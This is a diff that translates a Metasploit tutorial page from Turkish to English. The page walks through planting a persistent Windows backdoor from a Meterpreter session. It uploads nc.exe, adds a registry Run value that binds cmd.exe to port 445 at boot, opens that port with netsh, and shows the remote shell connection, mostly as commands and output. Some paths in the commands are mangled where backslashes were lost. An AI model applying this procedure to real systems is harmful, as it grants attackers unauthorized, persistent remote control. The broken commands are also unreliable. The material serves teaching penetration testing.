@@ -1,13 +1,13 @@
 ---
 draft: false
-title: MSF Registry Üzerinde Çalışma
-linkTitle: MSF Registry Üzerinde Çalışma
+title: MSF Working on Registry
+linkTitle: MSF Working on Registry
 translationKey: msf-working-on-registry
 weight: 320
 date: 2017-06-05T13:27:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-description: Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak reg komutunu sunmaktadır.
-url: /tr/msf-registry-uzerinde-calisma/
+description: Meterpreter gives us the ability to work on the Windows Registry. In this article, we will examine how to work on the Windows Registry.
+url: /msf-working-on-registry/
 featured_image: /images/metasploit.jpg
 categories:
     - Metasploit Framework
@@ -15,11 +15,11 @@ tags:
     - cybersecurity
     - metasploit framework
 ---
-## Windows Registry İşlemleri
+## Windows Registry Operations
 
-Windows Registry ayarları, neredeyse tüm işlemlerin kayıtlarının tutulduğu sihirli bir alan gibidir. Bu alanda yapacağınız tek bir değişiklik, sistemde gerekli yetkiyi almanızı sağlayabilir. Bunun yanında, yapılacak hatalı bir işlem ise sistemin bir daha açılmamasına da sebep olabilir. Dikkatli ve acele etmeden hareket etmek gerekmektedir.
+Windows Registry is a magical area where almost all operations are recorded. A single change in this area can give you the necessary authority in the system. On the other hand, a wrong operation can cause the system not to boot again. You need to act carefully and not rush.
 
-Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak bir çok komut sunmaktadır. Bunlara kısaca bakalım. Bir sistemde Meterpreter shell açtığınızda `reg` komutunu verdiğinizde yardım bilgilerini görebilirsiniz.
+Meterpreter, a powerful tool in the Metasploit Framework, provides many commands that allow you to work on the Windows Registry. Let's take a brief look at them. When you open a Meterpreter shell on a system, you can see the help information by typing the `reg` command.
 
 ```bash
 meterpreter > reg
@@ -46,17 +46,17 @@ COMMANDS:
     queryval   Queries the data contents of a value [-k >key> -v >val>]
 ```
 
-Yardım komutunun sonucunda görebileceğiniz gibi, `reg` komutu, Registry üzerinde okuma (`queryval`), yazma (`setval`), yeni ayarlama oluşturma (`createkey`) ve silme (`deletekey`) olanağı sağlamaktadır.
+As you can see from the help command, the `reg` command provides the ability to read (`queryval`), write (`setval`), create new settings (`createkey`), and delete (`deletekey`) on the Registry.
 
-Bu komutlar sayesinde yeni değerler oluşturma, değerleri değiştirme yapabileceğiniz gibi doğru yerlere bakarak sistem hakkında bilgi toplama işlemleri de yapabilirsiniz. Windows Registry içerisinde hangi değerin nerede kayıt edildiği hakkında kendinizi geliştirmenizi tavsiye ediyorum. Bir fikir vermesi açısından [bağlantıda bulunan PDF dosyasını](https://support.accessdata.com/hc/en-us/article_attachments/201717329/Registry_Quick_Find_Chart_9-27-10.pdf) inceleyebilirsiniz.
+With these commands, you can create new values, change values, and collect information about the system by looking at the right places. I recommend you to improve yourself about where the value is stored in the system. For an idea, you can check the [PDF file](https://support.accessdata.com/hc/en-us/article_attachments/201717329/Registry_Quick_Find_Chart_9-27-10.pdf) in the link.
 
-## Kalıcı Netcat Arka Kapısı
+## Creating a Backdoor on Windows
 
-Aşağıda adım adım gerçekleştireceğimiz örnekte, hedef sisteme `netcat` programını yerleştireceğiz. Registry ayarlarında işlemler yaparak `netcat` programının bilgisayar açıldığında otomatik başlamasını ayarlayacağız. Sistemde bulunan Firewall ayarlarının, `netcat` programına ve 445 numaralı porta müsaade etmesini sağlayacağız.
+In this article, we will examine how to create a backdoor on a Windows system using the Registry. We will place the `netcat` program on the target system. By making changes in the Registry settings, we will set the `netcat` program to start automatically when the computer is turned on. We will ensure that the Firewall settings allow `netcat` program and port 445.
 
-### nc.exe Programını Yükleme
+### Uploading netcat Program nc.exe to the Target System
 
-Öncelikle hedef Windows işletim sisteminin içerisine `nc.exe` olarak bilinen netcat programını yükleyelim. Bunun için önceden bir şekilde meterpreter shell açmış olmalısınız. Bununla ilgili örnekleri önceki yazılarımızda belirtmiştik. Kali işletim sistemi içerisinde `/usr/share/windows-binaries/` klasöründe faydalı bir kaç programı bulabilirsiniz.
+First of all, let's upload the netcat program, known as `nc.exe`, to the target Windows operating system. You must have previously opened a meterpreter shell. We have mentioned examples of this in our previous articles. You can find some useful programs in the `/usr/share/windows-binaries/` folder in the Kali operating system.
 
 ```bash
 meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
@@ -64,9 +64,9 @@ meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
 > uploaded   : /tmp/nc.exe -> C:\windows\system32nc.exe
 ```
 
-### netcat Başlangıçta Otomatik Çalışsın
+### netcat Program to Run Automatically
 
-nc.exe programının işletim sisteminin her başladığında çalışması için Registry içinde `HKLM\software\microsoft\windows\currentversion\run` anahtarına bir değer oluşturmalısınız. Öncelikle, mevcut değerleri ve ayarları görelim. Ters \ işaretlerinin iki defa yazıldığına dikkat edin.
+To run the nc.exe program every time the operating system starts, you must create a value in the Registry key `HKLM\software\microsoft\windows\currentversion\run`. First, let's see the current values and settings. Note that the backslash `\` characters are written twice.
 
 ```bash
 meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
@@ -79,7 +79,7 @@ Enumerating: HKLM\software\microsoft\windows\currentversion\run
     quicktftpserver
 ```
 
-Komut çıktısında görüldüğü gibi şu an için `VMware Tools, VMware User Process, quicktftpserver` yazılımları otomatik başlamaya ayarlanmış durumda. Biz yeni ayarımızı `reg setval` komutu ile ilave edelim ve `reg queryval` komutu ile tekrar kontrol edelim.
+As seen in the command output, the `VMware Tools, VMware User Process, quicktftpserver` software is currently set to start automatically. Let's add our new setting with the `reg setval` command and check it again with the `reg queryval` command.
 
 ```bash
 meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32 c.exe -Ldp 445 -e cmd.exe'
@@ -91,9 +91,9 @@ Type: REG_SZ
 Data: C:\windows\system32 c.exe -Ldp 445 -e cmd.exe
 ```
 
-### Firewall Ayarları
+### Firewall Settings
 
-Doğrudan Registry ayarlarından yapabileceğinizi gibi `netsh` komutu ile de firewall ayarlarını yapabilirsiniz. Kullanımı göstermek açısından, firewall ayarlarını komut satırından ayarlayalım. Bunun için Meterpreter komut satırından Windows komut satırına girelim.
+You can make firewall settings directly from the Registry settings, or you can make firewall settings with the `netsh` command. Let's set the firewall settings from the command line to show usage. To do this, let's enter the Windows command line from the Meterpreter command line.
 
 ```bash
 meterpreter > execute -f cmd -i
@@ -104,7 +104,7 @@ Microsoft Windows XP [Version 5.1.2600]
 C:\ >
 ```
 
-Firewall ayarlarının mevcut halini görelim.
+Let's see the current state of the Firewall settings.
 
 ```bash
 C:\ > netsh firewall show opmode
@@ -125,7 +125,7 @@ Local Area Connection firewall configuration:
 Operational mode                  = Enable
 ```
 
-Şimdi 445 numaralı Portu izin verilen Portlar arasına ekleyelim.
+Now let's add the port 445 to the allowed ports.
 
 ```bash
 C:\ > netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
@@ -133,7 +133,7 @@ netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
 Ok.
 ```
 
-Yaptığımız işlemin hayata geçip geçmediğini kontrol edelim.
+Let's check if the operation we performed has been successful.
 
 ```bash
 C:\ > netsh firewall show portopening
@@ -158,7 +158,9 @@ Port   Protocol  Mode     Name
 C:\ >
 ```
 
-Hedef sistem tekrar başladığında `nc.exe` otomatik olarak çalışacak ve dışarıdan bağlantılara imkan sağlayacaktır. Aşağıdaki örnekte `nc` komutuyla hedef sisteme bağlanılabildiği görülmektedir.
+### Testing the Backdoor
+
+After making the necessary settings, you can restart the target system. When the target system restarts, `nc.exe` will automatically start and provide external connections. In the example below, it can be seen that the target system can be connected from the outside with the `nc` command.
 
 ```bash
 root@kali:~# nc -v 172.16.104.128 445
@@ -196,4 +198,4 @@ Start Menu
 C:\ >
 ```
 
-Gerçek durumlarda, böyle bir arka kapı açmak bu kadar kolay olmasa da uygulanacak işlemlerin mantığı yukarıda anlatıldığı gibidir. Bu yazıda, Registry kayıtları kullanarak bir arka kapı açmanın mantığını açıklamaya çalıştık. Yukarıdaki örneği birebir uygulayıp başarısız olursanız umutsuzluğa kapılmayın. Daha sıkı çalışın.
+In real situations, it is not so easy to open such a backdoor. However, the logic of the procedures to be applied is as explained above. If you fail to apply the above example exactly, do not despair. Work harder.
